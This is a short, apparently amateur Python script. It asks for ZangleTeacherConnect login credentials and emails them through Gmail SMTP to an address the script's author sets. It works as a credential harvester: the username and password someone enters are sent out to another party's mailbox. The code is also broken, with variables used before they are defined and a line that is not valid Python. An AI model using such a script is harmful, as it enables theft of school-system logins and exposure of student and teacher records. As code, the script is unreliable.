username = username1
password = password1
username1 = raw_input('Please insert your ZangleTeacherConnect username')
password1 = raw_input('Please insert your ZangleTeacherConnect password')

#FOR EMAILING IT TO YOURSELF
import smtplib
 
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
#REPLACE WITH YOUR EMAIL AND PASSWORD
server.login("YOUR EMAIL ADDRESS", "YOUR PASSWORD")
 
msg = username1 password1
server.sendmail("YOUR EMAIL ADDRESS", "THE EMAIL ADDRESS TO SEND TO", msg)
server.quit()
